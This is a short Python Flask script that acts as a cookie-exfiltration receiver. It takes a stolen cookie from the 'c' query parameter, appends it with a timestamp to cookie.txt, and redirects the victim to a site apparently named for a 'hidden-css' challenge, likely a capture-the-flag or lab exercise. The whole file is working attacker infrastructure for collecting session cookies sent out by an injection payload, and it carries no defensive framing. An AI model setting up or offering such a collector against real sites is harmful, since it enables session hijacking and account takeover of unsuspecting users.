from flask import Flask, request , redirect
from datetime import datetime

app = Flask(__name__) # create the instance of the app

@app.route('/') # our home url
def cookie():
    # grabbing the cookie and writing to file: cookie.txt
    cookie = request.args.get('c');
    f = open("cookie.txt","a");
    f.write(cookie + " " + str(datetime.now()) + "\n");
    f.close();

    # back to the website
    return redirect("https://hidden-css-tlejfksioa-ul.a.run.app/");

if __name__ == "__main__":
    app.run(host = "0.0.0.0",port=5000) # listen to all ip

